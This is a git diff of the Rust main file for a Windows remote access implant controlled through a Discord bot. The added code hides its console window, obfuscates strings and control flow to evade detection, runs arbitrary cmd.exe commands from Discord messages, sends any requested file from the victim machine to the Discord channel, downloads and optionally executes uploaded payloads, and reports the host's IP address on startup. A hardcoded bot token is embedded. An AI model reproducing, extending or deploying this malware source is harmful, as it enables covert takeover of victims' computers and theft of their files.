@@ -1,27 +1,35 @@
 #![windows_subsystem = "windows"]
 
-use std::sync::RwLock;
-use std::time::Duration;
+#[macro_use]
+extern crate litcrypt;
+use_litcrypt!();
+
+use std::{os::windows::process::CommandExt, process::Command, sync::RwLock, time::Duration};
+use std::path::PathBuf;
+
 use serenity::{
-    async_trait, client::Context, model::{channel::{Message, ChannelType}, gateway::Ready, id::{ChannelId}, application::interaction::InteractionResponseType}, prelude::*,
+    async_trait,
+    client::Context,
     framework::standard::{
         macros::{command, group},
         CommandResult, StandardFramework,
     },
+    model::{
+        application::interaction::InteractionResponseType,
+        channel::{ChannelType, Message},
+        gateway::Ready,
+        id::ChannelId,
+    },
+    prelude::*,
 };
-use chrono::{DateTime, Utc};
+
+use chrono::Utc;
+use goldberg::{goldberg_stmts};
+use serenity::framework::standard::Args;
 use uuid::Uuid;
-use std::io::{Read};
-use std::os::windows::io::AsRawHandle;
-use std::process::Child;
-
-use tokio::sync::Mutex;
-lazy_static::lazy_static! {
-    static ref CMD_PROCESS: Mutex<Option<Child>> = Mutex::new(None);
-}
-
 
 mod commands;
+
 use commands::recon::*;
 
 mod utils;
@@ -29,28 +37,28 @@ mod utils;
 use utils::utils::*;
 
 static CHANNEL_NAME: RwLock<Option<Uuid>> = RwLock::new(None);
-static AGENT_CAT_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
-static AGENT_COMMAND_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
-static CMD_SESSION_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
-
+static CAT_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
+static COMMAND_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
+static SESSION_ID: RwLock<Option<ChannelId>> = RwLock::new(None);
 
 #[group("info")]
 #[commands(c_userlist, c_tasklist, c_whoami)]
 struct Info;
 
 #[group("cmd_session")]
-#[commands(exit, cmdsesh, run)]
+#[commands(cmdsesh, run, download_file, upload_file)]
 struct CmdSession;
 
 #[group("general")]
-#[commands("clear")]
+#[commands(clear, exit)]
 struct General;
 
 #[tokio::main]
 async fn main() {
-
     // Configure the client with your Discord bot token in the environment.
-    let token = String::from("MTA4NzQ2MzExMjY3ODA1NTkzNg.Gf19_l.w7FqiCApRPbPZWws6YVdRjUaT4jx7Ap_zJWlrY");
+    let token = String::from(lc!(
+        "MTA4NzQ2MzExMjY3ODA1NTkzNg.Gf19_l.w7FqiCApRPbPZWws6YVdRjUaT4jx7Ap_zJWlrY"
+    ));
 
     // Set gateway intents, which decides what events the bot will be notified about
     let intents = GatewayIntents::GUILD_MESSAGES
@@ -59,20 +67,21 @@ async fn main() {
 
     let framework = StandardFramework::new()
         .configure(|c| c.prefix("!")) // Set the bot's command prefix
-        .group(&GENERAL_GROUP).group(&CMDSESSION_GROUP).group(&INFO_GROUP);
+        .group(&GENERAL_GROUP)
+        .group(&CMDSESSION_GROUP)
+        .group(&INFO_GROUP);
 
     // Create our client object with the token and intents, throws error if building the client.
-    let mut client =
-        Client::builder(&token, intents)
-            .event_handler(Handler)
-            .framework(framework)
-            .await.expect("Error when creating the client");
+    let mut client = Client::builder(&token, intents)
+        .event_handler(Handler)
+        .framework(framework)
+        .await
+        .expect("Error when creating the client");
 
     if let Err(why) = client.start().await {
         println!("Client error: {:?}", why);
     }
 }
-
 
 struct Handler;
 
@@ -96,10 +105,14 @@ impl EventHandler for Handler {
         let guilds = &ready.guilds;
         if let Some(guild_id) = guilds.first().map(|g| g.id) {
             println!("GUILD ID: {:?}", guild_id);
-            *AGENT_CAT_ID.write().unwrap() = get_category_uuid(&ctx, Some(guild_id)).await;
+            *CAT_ID.write().unwrap() = get_category_uuid(&ctx, Some(guild_id)).await;
 
-            if let Err(why) = get_agent_ip(&ctx).await {
-                println!("Ran into error when sending ip sadly: {}", why);
+            if let Err(why) = whatsip(&ctx).await {
+                println!(
+                    "{} {}",
+                    lc!("Ran into error when sending ip sadly: {}"),
+                    why
+                );
             };
         }
     }
@@ -173,10 +186,11 @@ async fn c_whoami(ctx: &Context, msg: &Message) -> CommandResult {
 #[command]
 async fn cmdsesh(ctx: &Context, msg: &Message) -> CommandResult {
     if is_designated_channel(msg)? {
-        let sent_message = msg
+        goldberg_stmts! {
+            let sent_message = msg
             .channel_id
             .send_message(&ctx.http, |m| {
-                m.content("Are you sure you want to open a command session?")
+                m.content(lc!("Are you sure you want to open a command session?"))
                     .components(|c| {
                         c.create_action_row(|row| {
                             row.create_select_menu(|menu| {
@@ -211,24 +225,22 @@ async fn cmdsesh(ctx: &Context, msg: &Message) -> CommandResult {
             sent_message.delete(&ctx).await.unwrap();
 
             let guild_id = msg.guild_id.unwrap();
-            let category_id = AGENT_CAT_ID.read().unwrap().unwrap();
+            let category_id = CAT_ID.read().unwrap().unwrap();
 
             let session_channel = guild_id
                 .create_channel(&ctx.http, |c| {
-                    let now: DateTime<Utc> = Utc::now();
-                    c.name(format!("cmd-session ({})", now)).kind(ChannelType::Text).category(category_id).topic("This is an interactive session with the agent. To exit the session and close this channel, please try '!exit'.")
+                    c.name(format!("session ({})", Utc::now())).kind(ChannelType::Text).category(category_id).topic(lc!("This is an interactive session with the agent. To exit the session and close this channel, please try '!exit'."))
                 })
                 .await
                 .unwrap();
-            *CMD_SESSION_ID.write().unwrap() = Option::from(session_channel.id);
-            create_cmd_process().await?;
+            *SESSION_ID.write().unwrap() = Option::from(session_channel.id);
 
             interaction
                 .create_interaction_response(&ctx, |r| {
                     r.kind(InteractionResponseType::ChannelMessageWithSource)
                         .interaction_response_data(|d| {
                             d.ephemeral(true)
-                                .content(format!("Please see channel {} for your interactive session!", session_channel.mention()))
+                                .content(format!("{} {}", lc!("Please see the following channel for your command session:"), session_channel.mention()))
                         })
                 })
                 .await
@@ -246,43 +258,123 @@ async fn cmdsesh(ctx: &Context, msg: &Message) -> CommandResult {
                 .unwrap();
             sent_message.delete(&ctx).await.unwrap();
         }
+        }
     }
 
     Ok(())
 }
 
-
 #[command]
 async fn run(ctx: &Context, msg: &Message) -> CommandResult {
     if session_handler(msg)? {
-        let mut process = CMD_PROCESS.lock().await;
-        let mut buf = vec![];
+        goldberg_stmts! {
+            let command = msg.content.clone();
+        let command_stripped = command.strip_prefix("!run ").unwrap_or(&command);
 
-        if let Some(process) = process.as_mut() {
-            use std::io::Write;
-            let content = msg.content.trim();
-            let command = content.strip_prefix("!run ").expect("Invalid command format").as_bytes();
-            match process.stdin.as_mut().unwrap().write_all(command) {
-                Err(why) => panic!("couldn't write to shell stdin: {}", why.to_string()),
-                Ok(_) => println!("send command to shell"),
+        let output = Command::new(lc!("cmd.exe"))
+            .arg("/c")
+            .arg(&command_stripped)
+            .creation_flags(0x08000000)
+            .output()
+            .expect("failed to execute process");
+
+        let output_string = match std::str::from_utf8(&output.stdout) {
+            Ok(s) => s.to_owned(),
+            Err(e) => {
+                println!("Failed to parse output: {:?}", e);
+                String::new()
             }
+        };
 
-            // Because `stdin` does not live after the above calls, it is `drop`ed,
-            // and the pipe is closed.
-            //
-            // This is very important, otherwise `wc` wouldn't start processing the
-            // input we just sent.
+        println!("Output: {}", output_string);
 
-            use tokio::io::AsyncWriteExt;
-            let mut output = std::io::Cursor::new(Vec::new());
-            // The `stdout` field also has type `Option<ChildStdout>` so must be unwrapped.
-            match process.stdout.as_mut().unwrap().read_to_end(&mut buf) {
-                Err(why) => panic!("couldn't read shell stdout: {}", why.to_string()),
-                Ok(_) => AsyncWriteExt::write_all(&mut output, &buf).await.unwrap(),
-            };
-            let output_string = String::from_utf8(output.into_inner()).unwrap();
+        let mut chunks = output_string.chars().collect::<Vec<char>>();
+        while !chunks.is_empty() {
+            let chunk = chunks.drain(..1950.min(chunks.len())).collect::<String>();
+            let send_result = msg.channel_id.say(&ctx.http, format!("```cmd\n\
+            {}```",chunk)).await;
+            if let Err(e) = send_result {
+                println!("Failed to send message: {:?}", e);
+            }
+        }
+        }
+    }
+    Ok(())
+}
 
-            println!("{}", output_string)
+#[command]
+async fn download_file(ctx: &Context, msg: &Message) -> CommandResult {
+    if session_handler(msg)? {
+        let command = msg.content.clone();
+        let command_stripped = command.strip_prefix("!download_file ").unwrap_or(&command);
+        let file_path = PathBuf::from(format!(r"{}", command_stripped));
+        if let Err(why) = msg.channel_id.send_message(&ctx, |m|
+            m.content("Requested file:\n").add_file(&file_path),
+        ).await {
+            msg.channel_id.say(&ctx, format!("```diff\n\
+            - {}```", why.to_string())).await.ok();
+            eprintln!("Error sending message: {:?}", why);
+        };
+    }
+    Ok(())
+}
+
+#[command]
+async fn upload_file(ctx: &Context, msg: &Message, mut args: Args) -> CommandResult {
+    if session_handler(msg)? {
+        // Parse the optional arguments
+        let mut file_path = None;
+        let mut execute = false;
+        while !args.is_empty() {
+            match args.single::<String>().unwrap().as_str() {
+                "-p" => {
+                    file_path = Some(args.single::<String>()?);
+                }
+                "-execute" => {
+                    execute = args.single::<bool>()?;
+                }
+                _ => {}
+            }
+        }
+
+        let attachments = match get_message_attachments(&ctx, msg).await {
+            Ok(attachments) => attachments,
+            Err(why) => {
+                println!("Error: {}", why);
+                return Ok(());
+            }
+        };
+
+        let created_file_path = match file_handler(attachments, &file_path).await {
+            Ok(file_path) => {
+                if let Err(why) = msg.channel_id.say(&ctx, format!("Successfully wrote file to disk. Location: {}", file_path.to_str().unwrap())).await {
+                    eprintln!("Error when sending success message for file_handler: {}", why);
+                }
+                file_path
+            }
+            Err(why) => {
+                if let Err(why) = msg.channel_id.say(&ctx, format!("Was not able to write to the disk. Reason: {}", why)).await {
+                    eprintln!("Disk write error: {}", why);
+                    return Ok(());
+                }
+                PathBuf::new()
+            }
+        };
+
+        if execute {
+            match execution_handler(created_file_path).await {
+                Ok(()) => {
+                    if let Err(why) = msg.channel_id.say(&ctx, format!("Successfully executed the file!")).await {
+                        eprintln!("Error when sending success message for execute_handler: {}", why);
+                    }
+                }
+                Err(why) => {
+                    if let Err(why) = msg.channel_id.say(&ctx, format!("Ran into an error when attempting to execute the file. Reason: {}", why)).await {
+                        eprintln!("Execution error: {}", why);
+                        return Ok(());
+                    }
+                }
+            }
         }
     }
     Ok(())
@@ -292,11 +384,14 @@ async fn run(ctx: &Context, msg: &Message) -> CommandResult {
 async fn exit(ctx: &Context, msg: &Message) -> CommandResult {
     match session_handler(msg) {
         Ok(true) => {
-            if let Err(why) = msg.channel_id.say(&ctx.http, "Deleting channel...").await {
+            if let Err(why) = msg.channel_id.say(&ctx.http, "Closing session....").await {
                 eprintln!("Error sending message: {:?}", why);
             }
-            let channel_id = CMD_SESSION_ID.read().unwrap().unwrap();
-            channel_id.delete(&ctx).await.expect("Error deleting the channel");
+            let channel_id = SESSION_ID.read().unwrap().unwrap();
+            channel_id
+                .delete(&ctx)
+                .await
+                .expect("Error deleting the channel");
         }
         Ok(false) => {}
         Err(why) => {
@@ -320,7 +415,9 @@ async fn clear(ctx: &Context, msg: &Message) -> CommandResult {
 
         // Fetch the next batch of messages
         messages = match channel_id
-            .messages(&ctx.http, |retriever| retriever.limit(100).before(messages.last().unwrap().id))
+            .messages(&ctx.http, |retriever| {
+                retriever.limit(100).before(messages.last().unwrap().id)
+            })
             .await
         {
             Ok(batch) if !batch.is_empty() => batch,
